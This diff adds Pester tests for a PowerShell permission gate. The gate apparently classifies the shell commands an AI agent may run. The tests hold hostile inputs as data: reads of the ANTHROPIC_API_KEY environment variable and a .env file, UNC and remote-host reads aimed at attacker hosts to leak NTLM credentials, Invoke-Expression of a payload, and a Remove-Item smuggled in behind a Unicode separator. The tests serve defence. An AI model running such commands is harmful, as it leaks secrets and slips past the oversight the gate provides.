@@ -268,3 +268,166 @@ Describe 'Get-LokiCommandClass - regression: adversarial-review fixes (ADR-0006)
         Get-LokiCommandClass -CommandLine 'Get-Content x | iex' | Should -Be 'denied'
     }
 }
+
+# ===================================================================================================================
+# Runtime-safe enforcement layer: Resolve-LokiCommandDecision (moved here with the gate from claude.Tests.ps1,
+# issue #50). Get-LokiCommandClass above is the pure classifier; these prove the runtime Get-Command residual check,
+# the secret-target deny, and the side-effect/exfil deny -- each with a break-the-guard case (CLAUDE.md section 6).
+# ===================================================================================================================
+
+Describe 'Resolve-LokiCommandDecision (runtime Get-* residual mitigation, ADR-0006)' {
+
+    BeforeAll {
+        # A hijacking Get-* Function and Alias to prove the runtime mitigation downgrades a name that does NOT resolve
+        # to a real Cmdlet (ADR-0006). Get-Item is a genuine Cmdlet used for the positive case.
+        function global:Get-LokiFakeHijack { 'pwned' }
+        Set-Alias -Name Get-LokiFakeAlias -Value Get-Item -Scope Global
+    }
+
+    AfterAll {
+        Remove-Item Function:\Get-LokiFakeHijack -ErrorAction SilentlyContinue
+        Remove-Item Alias:\Get-LokiFakeAlias -ErrorAction SilentlyContinue
+    }
+
+    It 'keeps a read whose Get-* first token resolves to a real Cmdlet' {
+        $d = Resolve-LokiCommandDecision -CommandLine 'Get-Item C:\Windows'
+        $d.Class | Should -Be 'read'
+        $d.Reason | Should -Be 'read-allowlisted'
+    }
+
+    It 'downgrades a Get-* name that resolves to a Function (hijack) to mutate' {
+        $d = Resolve-LokiCommandDecision -CommandLine 'Get-LokiFakeHijack'
+        $d.Class | Should -Be 'mutate'
+        $d.Reason | Should -Be 'read-downgraded-noncmdlet'
+    }
+
+    It 'downgrades a Get-* name that resolves to an Alias to mutate' {
+        $d = Resolve-LokiCommandDecision -CommandLine 'Get-LokiFakeAlias'
+        $d.Class | Should -Be 'mutate'
+        $d.Reason | Should -Be 'read-downgraded-noncmdlet'
+    }
+
+    It 'downgrades an unresolvable Get-* name to mutate' {
+        $d = Resolve-LokiCommandDecision -CommandLine 'Get-DefinitelyNotARealCmdlet12345'
+        $d.Class | Should -Be 'mutate'
+        $d.Reason | Should -Be 'read-downgraded-unresolved'
+    }
+
+    It 'does not apply the Get-* check to curated pure-read tools (ipconfig stays read)' {
+        (Resolve-LokiCommandDecision -CommandLine 'ipconfig /all').Class | Should -Be 'read'
+    }
+
+    It 'passes a mutate through unchanged' {
+        $d = Resolve-LokiCommandDecision -CommandLine 'Remove-Item C:\x'
+        $d.Class | Should -Be 'mutate'
+        $d.Reason | Should -Be 'mutation-requires-confirm'
+    }
+
+    It 'passes a denied through unchanged' {
+        $d = Resolve-LokiCommandDecision -CommandLine 'Invoke-Expression $payload'
+        $d.Class | Should -Be 'denied'
+        $d.Reason | Should -Be 'denied'
+    }
+}
+
+Describe 'Resolve-LokiCommandDecision - secret-target deny (adversarial review, ADR-0007)' {
+
+    It 'blocks reading the process environment via the Env: drive' {
+        $d = Resolve-LokiCommandDecision -CommandLine 'Get-ChildItem Env:'
+        $d.Class | Should -Be 'denied'
+        $d.Reason | Should -Be 'secret-target-blocked'
+    }
+
+    It 'blocks a targeted API-key env read' {
+        (Resolve-LokiCommandDecision -CommandLine 'Get-Item Env:\ANTHROPIC_API_KEY').Class | Should -Be 'denied'
+    }
+
+    It 'blocks reading the .env secret file (relative path -- claude cwd is AppRoot)' {
+        (Resolve-LokiCommandDecision -CommandLine 'Get-Content home\.env').Class | Should -Be 'denied'
+    }
+
+    It 'blocks reading the .env secret file (absolute path)' {
+        (Resolve-LokiCommandDecision -CommandLine 'Get-Content C:\loki\home\.env').Class | Should -Be 'denied'
+    }
+
+    It 'BREAK-THE-GUARD: a genuine read cmdlet cannot exfiltrate the key by pointing at Env:' {
+        (Resolve-LokiCommandDecision -CommandLine 'Get-Content Env:\ANTHROPIC_API_KEY').Class | Should -Not -Be 'read'
+    }
+
+    It 'still allows an unrelated read (the guard is targeted, not a blanket deny)' {
+        (Resolve-LokiCommandDecision -CommandLine 'Get-ChildItem C:\Windows').Class | Should -Be 'read'
+    }
+}
+
+Describe 'Resolve-LokiCommandDecision - side-effect/exfil deny (adversarial review, ADR-0007)' {
+
+    It 'blocks Get-Help -Online (launches the default browser)' {
+        $d = Resolve-LokiCommandDecision -CommandLine 'Get-Help Get-Process -Online'
+        $d.Class | Should -Be 'denied'
+        $d.Reason | Should -Be 'read-side-effect-blocked'
+    }
+
+    It 'never auto-allows a UNC path read (coerced SMB/NTLM auth -> credential leak): <cmd>' -ForEach @(
+        @{ cmd = 'Test-Path \\10.0.0.5\share\x' }
+        @{ cmd = 'Get-ChildItem \\10.0.0.5\share' }
+        @{ cmd = 'Get-Content \\attacker\c$\loot' }
+    ) {
+        # The security property is "never read"; a clean UNC hits the side-effect deny, one with a '$' is already
+        # mutate via the pure classifier -- both are blocked by the hook.
+        (Resolve-LokiCommandDecision -CommandLine $cmd).Class | Should -Not -Be 'read'
+    }
+
+    It 'a clean UNC read is denied specifically by the side-effect rule' {
+        (Resolve-LokiCommandDecision -CommandLine 'Test-Path \\10.0.0.5\share\x').Reason | Should -Be 'read-side-effect-blocked'
+    }
+
+    It 'never auto-allows a FORWARD-slash or mixed-slash UNC -- .NET normalizes // to a UNC too (review 2026-07-18): <cmd>' -ForEach @(
+        @{ cmd = 'Get-Content //attacker.example/share/x' }
+        @{ cmd = 'Test-Path //10.0.0.5/share' }
+        @{ cmd = 'Get-ChildItem /\attacker/share' }
+    ) {
+        (Resolve-LokiCommandDecision -CommandLine $cmd).Class | Should -Not -Be 'read'
+    }
+
+    It 'a forward-slash UNC read is denied specifically by the side-effect rule' {
+        (Resolve-LokiCommandDecision -CommandLine 'Get-Content //attacker/share/x').Reason | Should -Be 'read-side-effect-blocked'
+    }
+
+    It 'never auto-allows a remote-target parameter on a read cmdlet (WinRM/DCOM auth -> NetNTLM leak): <cmd>' -ForEach @(
+        @{ cmd = 'Get-CimInstance Win32_OperatingSystem -ComputerName attacker.example' }
+        @{ cmd = 'Get-WinEvent -LogName System -ComputerName attacker' }
+        @{ cmd = 'Get-Service -CN attacker' }
+        @{ cmd = 'Get-CimInstance Win32_Service -CimSession sess1' }
+    ) {
+        (Resolve-LokiCommandDecision -CommandLine $cmd).Class | Should -Be 'denied'
+    }
+
+    It 'still allows the legit LOCAL reads these rules must NOT catch (no false positive): <cmd>' -ForEach @(
+        @{ cmd = 'ipconfig /all' }                      # single slash + a switch -- not a UNC
+        @{ cmd = 'Get-CimInstance Win32_LogicalDisk' }  # local CIM, no -ComputerName
+        @{ cmd = 'ping 8.8.8.8' }                       # native reachability (bare host) -- intended diagnosis
+    ) {
+        (Resolve-LokiCommandDecision -CommandLine $cmd).Class | Should -Be 'read'
+    }
+
+    It 'blocks non-space/tab whitespace riding along an otherwise-read command (Unicode separator)' {
+        # U+2028 IS .NET whitespace, so the first token tokenizes cleanly to a real read cmdlet -> reaches the
+        # read-enforcement control-char check, which blocks it.
+        $sneaky = 'Get-Process' + [char]0x2028 + 'Remove-Item C:\temp\x'
+        $d = Resolve-LokiCommandDecision -CommandLine $sneaky
+        $d.Class | Should -Be 'denied'
+        $d.Reason | Should -Be 'nonascii-control-blocked'
+    }
+
+    It 'blocks a control character in the arguments of an otherwise-read command' {
+        # netstat is a pure-read command that takes any arguments, so the first token classifies as read and the
+        # control char in the args is what the enforcement check must catch (ipconfig would already be mutate here).
+        $d = Resolve-LokiCommandDecision -CommandLine ('netstat ' + [char]0x07)
+        $d.Class | Should -Be 'denied'
+        $d.Reason | Should -Be 'nonascii-control-blocked'
+    }
+
+    It 'still allows a normal read with plain spaces (no false positive)' {
+        (Resolve-LokiCommandDecision -CommandLine 'Get-ChildItem C:\Windows\System32').Class | Should -Be 'read'
+    }
+}
